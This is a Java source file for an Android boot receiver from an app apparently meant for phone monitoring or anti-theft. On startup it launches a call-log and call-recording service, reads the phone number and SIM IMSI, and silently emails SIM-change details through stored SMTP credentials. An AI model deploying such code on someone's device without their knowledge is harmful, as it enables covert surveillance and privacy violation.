package com.shiliukeji.xc_lsy.androidkillerservice.reveiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.service.GetSharePrefe;
import com.shiliukeji.xc_lsy.androidkillerservice.service.OtherOperatorService;
import com.shiliukeji.xc_lsy.androidkillerservice.service.PhoneService;

/**
 * Created by XC_LSY on 2017/7/6.
 */

public class BootBroadcastReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        XLog.d("检测到开机信息！");
        GetSharePrefe paras = new GetSharePrefe(context);
        SharedPreferences zcps = context.getSharedPreferences("reg", 0);
        if (paras.isTonghuajilu() || paras.isTonghualuyin()) {
            context.startService(new Intent(context, PhoneService.class));
        }
        try {
            String str = "";
            String IMSI = "0";
            try {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                str = telephonyManager.getLine1Number();
                IMSI = telephonyManager.getSubscriberId();
            } catch (Exception e) {
                e.printStackTrace();
            }
            String shoujiName = paras.getShoujiName();
            String userEmail = paras.getUserEmail();
            String userIMSI = paras.getCardIMSI();
            boolean iszhuce = OtherOperatorService.isReg(paras.getUserEmail(), paras.getShoujiImei(), zcps.getString("zhucema", ""));
            boolean ischange = !userIMSI.equals(IMSI);
            if (iszhuce && ischange && OtherOperatorService.check3Gwifi(context)) {
                XLog.d("开始发送开机信息！");
                OtherOperatorService.uploadEmail(paras.getSmtp(), paras.getPort(), userEmail, paras.getUserPassword(), userEmail, new String[]{userEmail}, new StringBuilder(String.valueOf(shoujiName)).append("发来--换卡通知").toString(), "换前卡信息：" + paras.getCardNumber() + "," + paras.getCardIMSI() + "<br/>" + "换后卡信息：" + str + "," + IMSI + "(" + OtherOperatorService.getCardName(IMSI) + ")");
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }
}